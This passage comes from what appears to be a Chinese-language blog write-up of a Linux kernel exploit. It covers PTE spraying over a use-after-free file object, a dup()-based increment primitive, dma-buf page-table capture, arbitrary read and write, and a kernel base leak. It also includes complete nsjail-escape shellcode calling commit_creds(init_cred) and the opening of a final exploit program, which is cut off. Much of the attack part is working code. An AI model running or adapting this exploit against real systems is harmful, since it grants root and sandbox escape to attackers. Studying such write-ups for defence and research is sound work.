+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// This step is to prepare spray PTEs the follow</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAYNUM; i++)&#123;</span><br><span class="line">    spray_page[i] = mmap((<span class="type">void</span> *)(<span class="number">0xdead0000</span>UL + i*(<span class="number">0x10000</span>UL)),</span><br><span class="line">                         <span class="number">0x8000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">                         MAP_ANONYMOUS | MAP_SHARED, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (spray_page[i] == MAP_FAILED) err_msg(<span class="string">&quot;fail to mmap space&quot;</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output_msg (<span class="string">&quot;STEP.3 Spray PTEs to fill the victim slab of victim UAF filp object&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SPRAYNUM/<span class="number">2</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">    *(<span class="type">char</span> *)(spray_page[i] + j*<span class="number">0x1000</span>) = <span class="string">&#x27;A&#x27;</span> + j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_20-32-12.png"
+                      alt="nipaste_2024-04-10_20-32-1"
+                ></p>
+<p>从上图可以看到，与前面 file object 那张图比较可以发现，同样的位置已经被页表项填充了，这样就完成了我们这一步的目的，参考下图理解。</p>
+<p><strong>注意这里需要提一下，页表项的构造，在上面的页表项中低 12 位用作标记位，其中 0x122a0b 才是对应的页框号</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_20-40-31.png"
+                      alt="nipaste_2024-04-10_20-40-3"
+                ></p>
+<h4 id="建立增量原语并定位-victim-PTE"><a href="#建立增量原语并定位-victim-PTE" class="headerlink" title="建立增量原语并定位 victim PTE"></a>建立增量原语并定位 victim PTE</h4><p>这里的 victim PTE 可以理解为其实就是我们前面提到的跟 f_count 占据同一个 8 字节的页表项，增量原语也不要理解的过于复杂，实际上就是想办法能够让我们的 PTE 中的内容能够增加，而这个增量原语就是要通过我们前面一直提到的 f_count 来实现，先来看看一个 file object 结构体的字段有哪些（借助 <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/sonnet/p/15616095.html" >phole <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 得到）：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>  <span class="title">fu_llist</span>;</span>             <span class="comment">/*     0     8 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> <span class="title">fu_rcuhead</span> __<span class="title">attribute__</span>((__<span class="title">aligned__</span>(8)));</span> <span class="comment">/*     0    16 */</span></span><br><span class="line">	&#125; f_u __attribute__((__aligned__(<span class="number">8</span>)));           <span class="comment">/*     0    16 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>                <span class="title">f_path</span>;</span>               <span class="comment">/*    16    16 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *             <span class="title">f_inode</span>;</span>              <span class="comment">/*    32     8 */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>  * <span class="title">f_op</span>;</span>            <span class="comment">/*    40     8 */</span></span><br><span class="line">	<span class="type">spinlock_t</span>                 f_lock;               <span class="comment">/*    48     4 */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>               <span class="title">f_write_hint</span>;</span>         <span class="comment">/*    52     4 */</span></span><br><span class="line">	<span class="type">atomic_long_t</span>              f_count;              <span class="comment">/*    56     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 1 boundary (64 bytes) --- */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>               f_flags;              <span class="comment">/*    64     4 */</span></span><br><span class="line">	<span class="type">fmode_t</span>                    f_mode;               <span class="comment">/*    68     4 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>               <span class="title">f_pos_lock</span>;</span>           <span class="comment">/*    72    32 */</span></span><br><span class="line">	<span class="type">loff_t</span>                     f_pos;                <span class="comment">/*   104     8 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>         <span class="title">f_owner</span>;</span>              <span class="comment">/*   112    32 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 2 boundary (128 bytes) was 16 bytes ago --- */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>  *       <span class="title">f_cred</span>;</span>               <span class="comment">/*   144     8 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>       <span class="title">f_ra</span>;</span>                 <span class="comment">/*   152    32 */</span></span><br><span class="line">	u64                        f_version;            <span class="comment">/*   184     8 */</span></span><br><span class="line">	<span class="comment">/* --- cacheline 3 boundary (192 bytes) --- */</span></span><br><span class="line">	<span class="type">void</span> *                     f_security;           <span class="comment">/*   192     8 */</span></span><br><span class="line">	<span class="type">void</span> *                     private_data;         <span class="comment">/*   200     8 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>           <span class="title">f_ep_links</span>;</span>           <span class="comment">/*   208    16 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>           <span class="title">f_tfile_llink</span>;</span>        <span class="comment">/*   224    16 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *     <span class="title">f_mapping</span>;</span>            <span class="comment">/*   240     8 */</span></span><br><span class="line">	<span class="type">errseq_t</span>                   f_wb_err;             <span class="comment">/*   248     4 */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* size: 256, cachelines: 4, members: 21 */</span></span><br><span class="line">	<span class="comment">/* padding: 4 */</span></span><br><span class="line">	<span class="comment">/* forced alignments: 1 */</span></span><br><span class="line">&#125; __attribute__((__aligned__(<span class="number">8</span>)));</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到 f_count 位于 56 字节到 64 字节，我们可以通过 <code>dup(fd)</code>，来让 f_count 实现<strong>增原语</strong>，可是别忘了我们此时这个位置已经被页表项填充了，所以说我们实际上可以通过 dup(fd) 来完成修改页表项的内容，假设下图为我们<strong>初始情况</strong>，每一个页表项对应一个大小为 0x1000 的物理地址空间，此时 victim pte 还是指向自己的 page。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_20-56-04.png"
+                      alt="nipaste_2024-04-10_20-56-0"
+                ></p>
+<p>我们调用 <code>dup(fd)</code> 0x1000 次后的 victim pte 指向情况如下图所示，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-01-00.png"
+                      alt="nipaste_2024-04-10_21-01-0"
+                > </p>
+<p>可以看到此时 victim pte 已经指向了另外一个地址空间，这使得它<strong>从用户态访问其内容时就会发生变化</strong>，我们可以通过这一点来找到 victim pte，为了方便读者进一步理解，我这里在放出 pte 真实情况下的状态。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-06-17.png"
+                      alt="nipaste_2024-04-10_21-06-1"
+                ></p>
+<p>这里借助一个 <a class="link"   target="_blank" rel="noopener" href="https://github.com/bata24/gef?tab=readme-ov-file" >gef 插件神器 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 可以直接看物理地址的内容，会自动完成地址转换，可以看到其内容已经由之前指向的 0x48 变为了 0x41（‘A’） 。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-08-03.png"
+                      alt="nipaste_2024-04-10_21-08-0"
+                ></p>
+<h4 id="Catch-a-page-table-again"><a href="#Catch-a-page-table-again" class="headerlink" title="Catch a page table again"></a>Catch a page table again</h4><p>有了前面的那一步，细心地读者是不是想到如果一直 dup，让页表项指向一个内核 text&#x2F;data 物理地址，是不是就可以任意读写呢，可事实是我们mmap出来的区域和内核 text&#x2F;data 的位置差了很多，在资源有限的情况下我们不可能一直 dup，所以说这里我们需要用到另外一个办法。</p>
+<p>通过前面的内容我们知道，我们已经实现了让两个页表项指向了同一个位置，如果我们使用 <code>munmap() </code> 释放 page，将会得到一个 page UAF，然后我们在用 page table 去填充该 page 就可以完成对 page table 的修改了，可是事实并非如此，一个重要原因是从 <code>anonymous mmap()</code>中分配得到的页来自于  <strong>MIGRATE_MOVABLE free_area of the memory zone</strong>，而<strong>用户页表</strong>分配的 page 来自于 <strong>MIGRATE_UNMOVABLE free_area of the memory zone</strong>，所以说这使得我们要得到这个 page 的可能性非常低。</p>
+<p>这里就需要使用到原文作者提到的另外一个手法 ，通过<code>/dev/dma_heap/system</code>完成利用，有两点原因：一是该文件在<strong>安卓中</strong>可以由不受信任的 app 使用；二是 <strong>dma-buf</strong> 的实现相对来说比较简单。</p>
+<p>使用代码如下：</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> <span class="title">data</span>;</span></span><br><span class="line"></span><br><span class="line">data.len = <span class="number">0x1000</span>;</span><br><span class="line">data.fd_flags = O_RDWR;</span><br><span class="line">data.heap_flags = <span class="number">0</span>;</span><br><span class="line">data.fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ioctl(dma_heap_fd, DMA_HEAP_IOCTL_ALLOC, &amp;data) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;DMA_HEAP_IOCTL_ALLOC&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> dma_buf_fd = data.fd;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们可以通过 <code>mmap() dma_buf_fd</code> 实现共享页面在用户空间和内核之间的映射。这里我们需要注意到一件<strong>非常重要的事</strong>就是该<strong>共享页面</strong>从何而来，从那里分配得到，幸运的是其和 page table 一样都从 <code>MIGRATE_UNMOVABLE free_area</code> 分配得到，同时它们都从<strong>相同 order</strong> 下的分配页面。这使得我们可以有了如下做法：</p>
+<ul>
+<li>step.1 堆喷 page table</li>
+<li>step.2 申请一块共享页面</li>
+<li>step.3 堆喷 page table</li>
+</ul>
+<p>然后就有了下面的分配情况，</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-42-29.png"
+                      alt="nipaste_2024-04-10_21-42-2"
+                ></p>
+<p>下面要做的就是重新映射用户空间和内核空间地址（由munmap实现），再将 dma_buf 的物理空间映射到用户空间，需要知道的是 dma_buf 所在的物理位置是和 page_table 紧邻的（从相同order分配）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-49-35.png"
+                      alt="nipaste_2024-04-10_21-49-3"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-50-19.png"
+                      alt="nipaste_2024-04-10_21-50-1"
+                ></p>
+<p>可以看到重新映射的页表项内容和之前的页表项发生了很大的变化，上图红框中的页表项其实就对应下图中的一个状态（已经被 dup 0x1000 次后的情况）。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-58-29.png"
+                      alt="nipaste_2024-04-10_21-58-2"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_21-59-39.png"
+                      alt="nipaste_2024-04-10_21-59-3"
+                ></p>
+<p>上图中 <code>0x00000011e64d000</code> 开始后的内容实际上就是我们 dma_buf 重新映射后的空间，而这是一个 page table，这已经意味着我们可以随心所欲的修改 page table 到任意地址，简单来讲我们已经可以**任意地址写(AAW)<strong>和</strong>任意地址读(AAR)**了。</p>
+<h4 id="AAR-AAW"><a href="#AAR-AAW" class="headerlink" title="AAR &amp; AAW"></a>AAR &amp; AAW</h4><p><strong>leak kernel base</strong></p>
+<p>尽管有一些随机化的保护，可是仍然在一些固定地址处会存在内核地址之类的关键信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_22-07-04.png"
+                      alt="nipaste_2024-04-10_22-07-0"
+                ></p>
+<p>可以参考上面一些地址区间（开了随机化），正常不开 kaslr 的时候，上面这些地址除了第一个都是从 <code>0xffff888000000000</code> 开始的，所以说自己找的时候可以加个偏移来看。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_22-10-00.png"
+                      alt="nipaste_2024-04-10_22-10-0"
+                ></p>
+<p>像下面 0x2c01000 物理地址处就会保存有一个 内核地址，至于为什么有两个，相信大家应该都听过 <code>direct mapping area</code> ，其中这个空间中会保存其他所有页面的映射，这也解释了为什么会出现两个。</p>
+<h4 id="nsjail-逃逸"><a href="#nsjail-逃逸" class="headerlink" title="nsjail 逃逸"></a>nsjail 逃逸</h4><p>这一块涉及到笔者盲区了，所以直接拿原作者中的 shellcode 来打了，思路是通过任意写去 patch <code>do_symlinkat</code> 系统调用的函数功能，从而可以该调用直接在 nsjail 中进行调用，完整 shellcode 如下：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">  init_cred         equ 0x1445ed8</span><br><span class="line">  commit_creds      equ 0x00ae620</span><br><span class="line">  find_task_by_vpid equ 0x00a3750</span><br><span class="line">  init_nsproxy      equ 0x1445ce0</span><br><span class="line">  switch_task_namespaces equ 0x00ac140</span><br><span class="line">  init_fs                equ 0x1538248</span><br><span class="line">  copy_fs_struct         equ 0x027f890</span><br><span class="line">  kpti_bypass            equ 0x0c00f41</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">  endbr64</span><br><span class="line">  call a</span><br><span class="line">a:</span><br><span class="line">  pop r15</span><br><span class="line">  sub r15, 0x24d4c9</span><br><span class="line"></span><br><span class="line">  ; commit_creds(init_cred) [3]</span><br><span class="line">  lea rdi, [r15 + init_cred]</span><br><span class="line">  lea rax, [r15 + commit_creds]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; task = find_task_by_vpid(1) [4]</span><br><span class="line">  mov edi, 1</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; switch_task_namespaces(task, init_nsproxy) [5]</span><br><span class="line">  mov rdi, rax</span><br><span class="line">  lea rsi, [r15 + init_nsproxy]</span><br><span class="line">  lea rax, [r15 + switch_task_namespaces]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; new_fs = copy_fs_struct(init_fs) [6]</span><br><span class="line">  lea rdi, [r15 + init_fs]</span><br><span class="line">  lea rax, [r15 + copy_fs_struct]</span><br><span class="line">  call rax</span><br><span class="line">  mov rbx, rax</span><br><span class="line"></span><br><span class="line">  ; current = find_task_by_vpid(getpid())</span><br><span class="line">  mov rdi, 0x1111111111111111   ; will be fixed at runtime</span><br><span class="line">  lea rax, [r15 + find_task_by_vpid]</span><br><span class="line">  call rax</span><br><span class="line"></span><br><span class="line">  ; current-&gt;fs = new_fs [8]</span><br><span class="line">  mov [rax + 0x740], rbx</span><br><span class="line"></span><br><span class="line">  ; kpti trampoline [9]</span><br><span class="line">  xor eax, eax</span><br><span class="line">  mov [rsp+0x00], rax</span><br><span class="line">  mov [rsp+0x08], rax</span><br><span class="line">  mov rax, 0x2222222222222222   ; win</span><br><span class="line">  mov [rsp+0x10], rax</span><br><span class="line">  mov rax, 0x3333333333333333   ; cs</span><br><span class="line">  mov [rsp+0x18], rax</span><br><span class="line">  mov rax, 0x4444444444444444   ; rflags</span><br><span class="line">  mov [rsp+0x20], rax</span><br><span class="line">  mov rax, 0x5555555555555555   ; stack</span><br><span class="line">  mov [rsp+0x28], rax</span><br><span class="line">  mov rax, 0x6666666666666666   ; ss</span><br><span class="line">  mov [rsp+0x30], rax</span><br><span class="line">  lea rax, [r15 + kpti_bypass]</span><br><span class="line">  jmp rax</span><br><span class="line"></span><br><span class="line">  int3</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p><strong>最终结果</strong></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/Snipaste_2024-04-10_22-18-26.png"
+                      alt="nipaste_2024-04-10_22-18-2"
+                ></p>
+<h4 id="final-exp"><a href="#final-exp" class="headerlink" title="final exp"></a>final exp</h4><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECONDARY_STARTUP_64 0xffffffff81000030</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DMA_HEAP_IOCTL_ALLOC 0xc0184800</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">int</span> u32;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dma_heap_allocation_data</span> &#123;</span></span><br><span class="line">  u64 len;</span><br><span class="line">  u32 fd;</span><br><span class="line">  u32 fd_flags;</span><br><span class="line">  u64 heap_flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_msg</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[!] %s \033[0m\n&quot;</span>,msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">output_msg</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s \033[0m\n&quot;</span>,msg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_addr</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[35m\033[1m[*] %s == %p\033[0m\n&quot;</span>,msg,(<span class="type">size_t</span> *)value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    